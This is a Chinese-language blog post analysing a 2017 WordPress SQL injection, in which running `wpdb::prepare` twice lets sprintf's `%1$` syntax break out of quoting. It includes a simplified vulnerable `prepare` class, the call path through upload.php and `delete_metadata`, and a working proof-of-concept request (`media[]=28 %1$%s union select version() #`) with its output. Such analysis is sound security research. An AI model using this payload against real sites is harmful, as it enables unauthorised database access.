---
id: 774
layout: post
title: '重复 prepare 带来的 WordPress 注入漏洞分析'
date: 2017-08-30 03:09:07
author: virusdefender
tags: 安全
---

原文比较乱，重新整理和总结了一下
 
 https://medium.com/websec/wordpress-sqli-bbb2afcc8e94  
 https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e
 
## sprintf 函数

两个例子

 - 可以使用 `%n$` 取到第 n 个参数

```php
echo sprintf('The %2$s contains %1$d monkeys', 100, "zoo");
```

输出 `The zoo contains 100 monkeys`

 - `%n$` 后面可以加入 padding 的指示符，使用 `'`开头

> An optional padding specifier that says what character will be used for padding the results to the right string size. This may be a space character or a 0 (zero character). The default is to pad with spaces. An alternate padding character can be specified by prefixing it with a single quote ('). 

```php
echo sprintf('The %2$s contains %1$\'#10d monkeys', 100, "zoo");
```
输出 `The zoo contains #######100 monkeys`

## prepare 函数

[原始代码](https://github.com/WordPress/WordPress/blob/820d3973a33d60ce710bfd5b2f5a0b40c37ca785/wp-includes/wp-db.php#L1228)

下面是一个精简版的

```php
class wpdb {
  function _real_escape( $string ) {
    return addslashes( $string );
  }

  public function escape_by_ref( &$string ) {
    if ( ! is_float( $string ) )
      $string = $this->_real_escape( $string );
  }

  public function prepare( $query, $args ) {
    $args = func_get_args();
    array_shift( $args );
    // If args were passed as an array (as in vsprintf), move them up
    if ( isset( $args[0] ) && is_array($args[0]) ) {
      $args = $args[0];
    }
    // in case someone mistakenly already singlequoted it
    $query = str_replace( "'%s'", '%s', $query ); 
    // doublequote unquoting
    $query = str_replace( '"%s"', '%s', $query ); 
    // quote the strings, avoiding escaped strings like %%s
    $query = preg_replace( '|(?<!%)%s|', "'%s'", $query );
    array_walk( $args, array( $this, 'escape_by_ref' ) );
    var_dump("query: ".$query);
    return @vsprintf( $query, $args );
  }
}
```

prepare 函数的作用

 - 整理函数参数，`$args` 为 array
 - 将 `$args` 中的 `'%s'` 和 `"%s"` 的单双引号去掉
 - 将 `$args` 中的 `%s` 变为 `'%s'`
 - `addslashes` `$args` 中的参数

## 函数调用栈

在 [upload.php](https://github.com/WordPress/WordPress/blob/master/wp-admin/upload.php#L163) 调用了 [wp_delete_attachment( $post_id_del )](https://github.com/WordPress/WordPress/blob/9891448a421f495e3745356bab88ec985a0e64b8/wp-includes/post.php#L4864)

`wp_delete_attachment` 中，`$post_id` 是用户可以完全控制的参数，来自 `$post_ids = $_REQUEST['media']`，然后循环执行下面的逻辑

```php
if ( !$post = $wpdb->get_row( $wpdb->prepare("SELECT * FROM $wpdb->posts WHERE ID = %d", $post_id) ) )
    return $post;
```

这里有第一个检查，但是因为是 `%d`，虽然 `$post_id` 不是数字，但是如果是数字开头还是可以被转换为了数字的，可以绕过。

然后调用了 [delete_metadata( 'post', null, '_thumbnail_id', $post_id, true )](https://github.com/WordPress/WordPress/blob/3ecfb4b222e55b8e064c1b56b7b7030bc4fc940d/wp-includes/meta.php#L307)

有第二个检查，无法绕过，必须要插入数据，否则就 `return false`了。而且 `meta_value` 是 payload，这也是原文中要使用  XML-RPC 的原因

这里 `$meta_value` 就是上面的 `$post_id`

```php
$query = $wpdb->prepare( "SELECT $id_column FROM $table WHERE meta_key = %s", $meta_key );
if ( !$delete_all )
  $query .= $wpdb->prepare(" AND $type_column = %d", $object_id );
if ( '' !== $meta_value && null !== $meta_value && false !== $meta_value )
  $query .= $wpdb->prepare(" AND meta_value = %s", $meta_value );
$meta_ids = $wpdb->get_col( $query );
if ( !count( $meta_ids ) )
  return false;
```

接下来的流程直接带入 POC 了

```php
$obj= new wpdb;
// 用户可以完全控制的参数
$meta_value = "%1$%s and PAYLOAD";
$value_clause = $obj->prepare(" and meta_value = %s", $meta_value);
$sql = "select * from table where meta_key=%s $value_clause";
var_dump($sql);
// value_clause 被 prepare 了两遍
var_dump($obj->prepare($sql, "***"));
```

的结果是

```php
// 将 %s 放入单引号内，准备 sprintf
string(29) "query:  and meta_value = '%s'"
// %s 被替换为 %1$%s and PAYLOAD
string(75) "select * from table where meta_key=%s  and meta_value = '%1$%s and PAYLOAD'"
// 再次 prepare，%s 被放入单引号内
string(86) "query: select * from table where meta_key='%s'  and meta_value = '%1$'%s' and PAYLOAD'"
// 第一个 %s 变成 ***，%1$ 变为 ***，'%s 不需要 padding 就消失了
string(77) "select * from table where meta_key='***'  and meta_value = '***' and PAYLOAD'"
```

还可以这样测试下

```php
var_dump(sprintf('select * from table where meta_key=\'%s\'  and meta_value = \'5 %1$\'%10s\' and PAYLOAD\'', "***"));
```

的输出是

```php
string(86) "select * from table where meta_key='***'  and meta_value = '5 %%%%%%%***' and PAYLOAD'"
```

POC 是 `/wp-admin/upload.php?_wpnonce=e3280c0238&action=delete&media[]=28 %1$%s union select version() # `

```php
string(128) "SELECT post_id FROM wp_postmeta WHERE meta_key = '_thumbnail_id'  AND meta_value = '28 _thumbnail_id' union select version() # '"
array(1) {
  [0]=>
  string(6) "5.7.19"
}
```


## 总结

 - 这个漏洞很难利用，但是其他位置或者插件可能也有类似的问题，比如 https://blog.sucuri.net/2017/02/sql-injection-vulnerability-nextgen-gallery-wordpress.html
 - 其他框架也可能有类似的问题

